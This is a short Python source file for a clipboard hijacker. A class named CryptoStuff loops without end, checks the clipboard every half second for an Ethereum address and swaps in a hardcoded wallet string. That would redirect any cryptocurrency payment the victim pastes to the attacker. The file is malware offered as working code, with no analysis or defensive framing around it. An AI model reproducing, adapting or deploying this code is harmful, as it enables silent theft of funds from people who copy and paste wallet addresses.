import re
import pyperclip
import time


class CryptoStuff(object):

    def __init__(self) -> None:
        self.eth_wallet = "0x11b0460655d3adb1"
        self.wallet_replace()

    def wallet_replace(self):

        while True:
            s = pyperclip.paste()

            if re.match(r'0x[a-fA-F0-9]{40}', s):
                pyperclip.copy(self.eth_wallet)
            time.sleep(0.5)
